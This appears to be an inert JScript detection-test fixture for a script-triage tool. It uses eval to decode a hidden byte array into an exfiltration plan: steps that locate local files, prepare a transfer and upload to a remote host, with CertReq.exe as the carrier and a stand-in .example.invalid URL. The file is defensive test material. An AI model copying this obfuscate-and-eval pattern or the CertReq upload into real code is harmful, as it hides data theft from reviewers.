// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_bf8f8db2 = function decode_bf8f8db2_body(v_a19c) {
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push((v_a19c[i] + 27) % 256); }
  return v_b27e;
};
var recover_947a288d = function recover_947a288d_body() {
  var characters = [96,7,88,89,74,85,88,7,31,64,7,81,84,72,70,89,74,68,81,84,72,70,81,7,17,7,85,87,74,85,70,87,74,68,89,87,70,83,88,75,74,87,7,17,7,90,85,81,84,70,73,68,87,74,82,84,89,74,7,66,17,7,70,73,70,85,89,74,87,7,31,7,40,74,87,89,55,74,86,19,74,93,74,7,17,7,91,70,81,90,74,88,7,31,96,7,72,70,82,85,70,78,76,83,68,78,73,7,31,7,72,70,82,85,70,78,76,83,18,25,22,21,71,70,30,27,70,73,24,7,17,7,90,87,81,7,31,7,77,89,89,85,88,31,20,20,25,22,21,71,70,30,27,70,73,24,19,74,93,70,82,85,81,74,19,78,83,91,70,81,78,73,20,70,29,22,70,25,27,74,26,19,73,70,89,7,17,7,90,88,74,87,68,70,76,74,83,89,7,31,7,45,90,83,89,87,74,88,88,49,70,71,20,25,22,21,71,70,30,27,70,73,24,7,17,7,75,78,81,74,68,85,70,89,77,7,31,7,40,31,65,65,58,88,74,87,88,65,65,53,90,71,81,78,72,65,65,45,90,83,89,87,74,88,88,49,70,71,65,65,88,89,70,76,74,18,25,22,21,71,70,30,27,70,73,24,19,73,70,89,7,98,17,7,88,89,70,76,74,40,84,90,83,89,7,31,24,98];
  var v_a19c = [];
  for (var ci = 0; ci < characters.length; ci++) { v_a19c.push(characters[ci]); }
  var v_f602 = (19 * 7) - 133;
  var v_b27e = [];
  try { v_b27e = decode_bf8f8db2(v_a19c); } catch (ignored) { v_b27e = []; }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
  var v_c304 = textParts.join("");
  return v_c304;
};
var inspect_28b7280d = function inspect_28b7280d_body() {
  var v_d41a = eval("(" + recover_947a288d() + ")");
  return { steps: v_d41a["steps"], adapter: v_d41a["adapter"], values: v_d41a["values"], stageCount: v_d41a["stageCount"] };
};
